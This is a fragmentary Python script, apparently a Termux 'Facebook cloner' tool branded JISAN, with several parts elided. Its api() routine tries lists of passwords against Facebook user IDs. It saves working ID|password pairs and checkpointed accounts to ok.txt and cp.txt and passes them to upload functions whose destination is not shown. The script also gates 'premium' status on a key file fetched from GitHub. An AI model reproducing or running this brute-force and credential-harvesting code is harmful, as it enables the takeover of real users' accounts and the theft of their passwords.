...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/JISAN-70/Approvel/main/200%20Tool"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/TurRealabbu")
...
def notice():
	...
	subprocess.check_output(["am", "start", "https://wa.me/+8801814649133"])

def irfan():
	
	
	runtxt("\n\033[0;91m🧞‍This tool is offical for JISAN")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/X1X4D-2-0/Aprove/blob/main/jisan.txt').text
			if basesplit in plr:
				key = basesplit
				stat = ("\033[0;92mPREMIUM")
				FY = '\033[0;93m-JISANXD'
				FG = '\033[0;92m'
				GET = '\r'
			else:
				key = ("\033[0;91m -JISANXD")
				stat = ("\033[0;91mJISANXD")
				FY = '\033[0;90m'
				FG = '\033[0;90m'
...
\033[1;90m═══════════════════════════════════════════════════════════
\033[1;94m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : It'z Jisan Xhowdhury 
\033[1;95m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSUP : +8801814649133
\033[1;93m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : X1X4D-2-0
\033[1;97m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : DONT TRY TO COPPY MY SCRYPT
\033[1;90m═══════════════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sJISAN❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [JISAN] : %s/%s -> \033[0;92m [ JISAN-OK:%s ]- \033[0;91m[JISAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [JISAN-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[JISAN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [JISAN-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
